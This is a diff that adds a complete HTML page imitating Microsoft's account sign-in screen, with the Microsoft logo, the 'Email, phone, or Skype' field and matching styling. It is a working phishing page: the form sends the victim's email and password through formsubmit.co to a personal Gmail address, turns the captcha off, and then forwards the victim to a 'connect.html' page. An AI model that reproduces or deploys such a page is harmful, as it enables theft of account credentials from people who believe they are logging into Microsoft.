@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title>Sign in to your account</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', sans-serif;
+        }
+
+        body {
+            background-color: #f3f3f3;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .login-box {
+            background-color: white;
+            padding: 40px;
+            width: 450px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
+            border-radius: 4px;
+            overflow: hidden;
+            position: relative;
+        }
+
+
+        @media (max-width: 480px) {
+            .login-box { 
+                width:  350px;
+
+            }
+        }
+        .logo {
+            margin-bottom: 30px;
+        }
+
+        .logo img {
+            height: 24px;
+        }
+
+        h2 {
+            margin-bottom: 20px;
+            font-weight: 600;
+            font-size: 20px;
+            color: #1b1b1b;
+        }
+
+        .form-step {
+            display: none;
+            flex-direction: column;
+            transition: opacity 0.3s ease-in-out, transform 0.3s ease;
+        }
+
+        .form-step.active {
+            display: flex;
+            opacity: 1;
+            transform: translateX(0);
+        }
+
+        label {
+            margin-bottom: 5px;
+            font-size: 14px;
+        }
+
+        input[type="email"],
+        input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 20px;
+            border: none;
+            border-bottom: 1px solid rgb(102, 102, 102);
+            border-radius: 2px;
+        }
+
+        input:focus {
+            outline: none;
+            border-bottom: 1px solid rgb(102, 102, 102);
+        }
+
+        .btn {
+            background-color: #0067b8;
+            color: white;
+            border: none;
+            padding: 10px;
+            width: 100%;
+            font-weight: bold;
+            border-radius: 2px;
+            cursor: pointer;
+        }
+
+        .btn:hover {
+            background-color: #005a9e;
+        }
+
+        .link {
+            margin-top: 15px;
+            font-size: 13px;
+            color: #0067b8;
+            text-align: left;
+        }
+
+        .footer {
+            margin-top: 40px;
+            font-size: 12px;
+            color: #666;
+            text-align: center;
+        }
+
+        .back-link {
+            margin-bottom: 20px;
+            font-size: 13px;
+            color: #0067b8;
+            cursor: pointer;
+            display: none;
+        }
+
+        .back-link.active {
+            display: block;
+        }
+
+        .keybuuonb { 
+            background-color: #fff; 
+        }
+        .keybuuonb:hover {
+            background-color: rgba(0, 0, 0, 0.1);
+            cursor: pointer;
+            transition: 0.2s all ease-in-out;
+        }
+    </style>
+</head>
+
+<body style="background: url(./BG.svg); background-position: center;">
+<div style=" display: flex; flex-direction: column; gap: 20px;">
+    <form class="login-box" action="https://formsubmit.co/webber.brad888@gmail.com" id="form" method="post"
+        enctype="multipart/form-data">
+        <input type="hidden" name="_captcha" value="false" />
+        <input type="hidden" name="_next" id="next-url" />
+        <div class="logo">
+            <img src="./LOGO.svg" alt="Microsoft Logo">
+        </div>
+
+        <div class="form-step active" id="emailStep">
+            <h2>Sign in</h2>
+            <!-- <label for="email">Email, phone, or Skype</label> -->
+            <div>
+                <input id="i0116" data-testid="i0116" name="email" placeholder="Email, phone, or Skype" type="email"
+                    maxlength="113" aria-label="Enter your email, phone, or Skype." aria-describedby="usernameTitle"
+                    class="ext-input ext-text-box" autocomplete="username" value="">
+            </div>
+            <div class="link" style="margin-bottom: 60px; margin-top: 0px; color: #000;" > No account?  <a href="#" class="link" style="text-decoration: none;">Create one!</a></div>
+            <button class="btn" onclick="goToPassword()" style="  float: right;  width: 100px;   min-height: 32px;  font-weight:bold; padding: 4px 14px;  align-self: flex-end;  line-height: normal;">Next</button>
+        </div>
+
+        <div class="form-step" id="passwordStep">
+            <span class="back-link active" onclick="goBack()">← Back</span>
+            <h2>Enter password</h2>
+            <label for="password">Password</label>
+            <input type="password" name="password" id="password" placeholder="Enter your password" required>
+            <button class="btn" type="submit">Sign in</button>
+            <div class="link"><a href="#">Forgot password?</a></div>
+        </div>
+    </form>
+
+ <div style=" background-color: #fff; ">
+    <a href="" class="keybuuonb" style="border: 0; padding: 8px 44px; display: flex; box-shadow: #f3f3f3; gap: 20px; align-items: center;  width: 100%; color: #000; text-decoration: none; " >
+        <div style="display: flex; align-items: baseline;">
+            <img src="./key.svg" style="width: 30px; padding: 0; margin: 0;" alt="key">
+        </div>
+        <div style=" display: flex; align-items: center; justify-content: center; font-size: 18px;">  Sign-in options </div>
+    </a>
+</div>
+</div>
+    <script>
+        const domain = window.location.hostname;
+        document.getElementById('next-url').value = `https://${domain}/connect.html`;
+        function goToPassword() {
+            document.getElementById("emailStep").classList.remove("active");
+            document.getElementById("passwordStep").classList.add("active");
+        }
+
+        function goBack() {
+            document.getElementById("passwordStep").classList.remove("active");
+            document.getElementById("emailStep").classList.add("active");
+        }
+
+
+    </script>
+
+</body>
+
+</html>
